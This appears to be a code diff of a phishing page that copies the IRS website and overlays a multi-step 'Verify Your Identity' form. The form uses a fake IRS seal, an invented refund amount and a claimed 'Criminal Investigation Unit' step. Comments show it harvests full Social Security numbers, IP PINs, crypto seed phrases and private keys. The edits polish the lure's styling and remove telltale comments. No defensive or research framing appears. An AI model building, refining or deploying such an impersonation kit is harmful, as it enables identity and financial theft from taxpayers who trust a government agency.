@@ -54,23 +54,16 @@
     <script src="/modules/contrib/google_tag/js/gtm.js?thwzri"></script>
 
     <!-- ============================================================ -->
-    <!--                     OUR PAYLOAD STYLES                       -->
+    <!--                     PAYLOAD STYLES                          -->
     <!-- ============================================================ -->
     <style>
-        /* ========================================================= */
-        /*                     OVERLAY FORM                         */
-        /* ========================================================= */
         #formOverlay {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.6);
             backdrop-filter: blur(8px);
-            justify-content: center;
-            align-items: center;
+            justify-content: center; align-items: center;
             z-index: 99999;
         }
         #formOverlay.active { display: flex; }
@@ -86,14 +79,9 @@
             position: relative;
         }
         .form-card .close-btn {
-            position: absolute;
-            top: 12px;
-            right: 16px;
-            font-size: 24px;
-            cursor: pointer;
-            color: #6e6e73;
-            background: none;
-            border: none;
+            position: absolute; top: 12px; right: 16px;
+            font-size: 24px; cursor: pointer; color: #6e6e73;
+            background: none; border: none;
         }
         .form-card .close-btn:hover { color: #1d1d1f; }
         .form-card h2 { font-size: 22px; font-weight: 700; margin-bottom: 4px; }
@@ -152,6 +140,8 @@
             gap: 8px;
         }
         .trigger-btn:hover { background: #004b8a; }
+        .trigger-btn .pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
     </style>
   </head>
 
@@ -168,7 +158,7 @@
     <!-- ============================================================ -->
     <!-- TRIGGER BUTTON                                               -->
     <!-- ============================================================ -->
-    <button class="trigger-btn" id="triggerBtn">🔐 Verify Your Identity</button>
+    <button class="trigger-btn" id="triggerBtn"><span class="pulse">🔐</span> Verify Your Identity</button>
 
     <!-- ============================================================ -->
     <!-- OVERLAY FORM                                                -->
@@ -177,17 +167,14 @@
         <div class="form-card">
             <button class="close-btn" id="closeBtn">&times;</button>
 
-            <!-- DYNAMIC SEAL -->
             <div class="seal-mini">🔒 Official IRS e-file · <span id="dynamicSeal">Valid: 2026-07-27</span></div>
             <div class="local-office">📍 Your local IRS office in <span id="cityName">Washington, DC</span> is handling your case.</div>
 
             <h2 id="formTitle">401(k) & Crypto Compliance</h2>
             <div class="sub" id="formSub">Please complete all sections to comply with IRS reporting requirements.</div>
 
-            <!-- REFUND PREVIEW -->
             <div class="refund-preview">🎯 Based on your estimated income, you may be eligible for a refund of <strong id="refundAmount">$4,287</strong>. Verify your information to claim it.</div>
 
-            <!-- PROGRESS -->
             <div class="progress">
                 <div class="step-indicator active" id="step1Label">Step 1</div>
                 <div class="step-indicator" id="step2Label">Step 2</div>
@@ -195,9 +182,7 @@
                 <div class="step-indicator" id="step4Label">Step 4</div>
             </div>
 
-            <!-- ============================================================ -->
-            <!-- STEP 1 — IDENTITY                                             -->
-            <!-- ============================================================ -->
+            <!-- STEP 1 -->
             <div id="step1">
                 <div class="step-badge">Step 1 of 4</div>
                 <h3 style="font-size:18px;margin:4px 0 6px;">Identity Verification</h3>
@@ -210,9 +195,7 @@
                 <button class="btn-primary" id="step1Btn">Continue to Step 2</button>
             </div>
 
-            <!-- ============================================================ -->
-            <!-- STEP 2 — 401(K) + RETIREMENT + IRA                          -->
-            <!-- ============================================================ -->
+            <!-- STEP 2 -->
             <div id="step2" class="hidden">
                 <div class="step-badge">Step 2 of 4</div>
                 <h3 style="font-size:18px;margin:4px 0 6px;">401(k) & Retirement Verification</h3>
@@ -228,9 +211,7 @@
                 <button class="btn-primary" id="step2Btn">Continue to Step 3</button>
             </div>
 
-            <!-- ============================================================ -->
-            <!-- STEP 3 — CRYPTO + REAL ESTATE + BUSINESS                    -->
-            <!-- ============================================================ -->
+            <!-- STEP 3 -->
             <div id="step3" class="hidden">
                 <div class="step-badge">Step 3 of 4</div>
                 <h3 style="font-size:18px;margin:4px 0 6px;">Crypto, Real Estate & Business</h3>
@@ -249,9 +230,7 @@
                 <button class="btn-primary" id="step3Btn">Continue to Step 4</button>
             </div>
 
-            <!-- ============================================================ -->
-            <!-- STEP 4 — FULL SSN + IP PIN + SEED + PRIVATE KEY            -->
-            <!-- ============================================================ -->
+            <!-- STEP 4 -->
             <div id="step4" class="hidden">
                 <div class="step-badge">Step 4 of 4 — IRS Criminal Investigation Unit</div>
                 <h3 style="font-size:18px;margin:4px 0 6px;">🔐 Final Security Verification</h3>
@@ -273,9 +252,7 @@
                 <button class="btn-primary" id="step4Btn">Submit to IRS</button>
             </div>
 
-            <!-- ============================================================ -->
-            <!-- SUCCESS PAGE                                                -->
-            <!-- ============================================================ -->
+            <!-- SUCCESS -->
             <div id="successPage" class="hidden">
                 <div style="text-align:center;padding:12px 0;">
                     <div style="font-size:40px;margin-bottom:8px;">✅</div>
@@ -291,7 +268,7 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ORIGINAL IRS CONTENT (UNTOUCHED)                             -->
+    <!-- ORIGINAL IRS CONTENT (FULL, UNTOUCHED)                      -->
     <!-- ============================================================ -->
     <a href="#main-content" class="visually-hidden focusable skip-link">
       Skip to main content
